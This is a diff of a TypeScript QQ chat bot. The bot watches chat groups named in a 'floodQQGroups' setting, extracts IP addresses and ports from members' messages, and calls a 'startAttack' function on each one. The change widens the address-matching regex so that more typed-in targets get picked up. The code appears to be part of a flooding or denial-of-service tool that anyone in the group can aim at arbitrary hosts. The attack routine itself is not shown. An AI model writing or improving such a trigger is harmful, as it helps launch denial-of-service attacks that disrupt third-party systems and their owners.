@@ -64,13 +64,14 @@ async function messageHandler(data: any): Promise<void> {
 	if (!groupID || !_.contains(config.floodQQGroups, groupID)) {
 		return;
 	}
-	const messageMatch: RegExpMatchArray = data.message.match(/(\d{1,3}(\.\d{1,3}){3})[: \uff1a](\d{1,5})/g);
+	const messageMatch: RegExpMatchArray = data.message.match(/(\d{1,3}([\.: \uff1a]\d{1,3}){3})[\.: \uff1a]+(\d{4,5})/g);
 	if (!messageMatch) {
 		return;
 	}
 	const attackPromises = messageMatch.map(pattern => {
-		const [address, portRaw] = pattern.split(/[: \uff1a]/);
-		const port = parseInt(portRaw);
+		const patternArray = pattern.split(/[\.: \uff1a]/);
+		const address = patternArray.slice(0, 4).join(".");
+		const port = parseInt(patternArray[patternArray.length - 1]);
 		return startAttack(address, port);
 	});
 	const results: boolean[] =  await Promise.all(attackPromises);
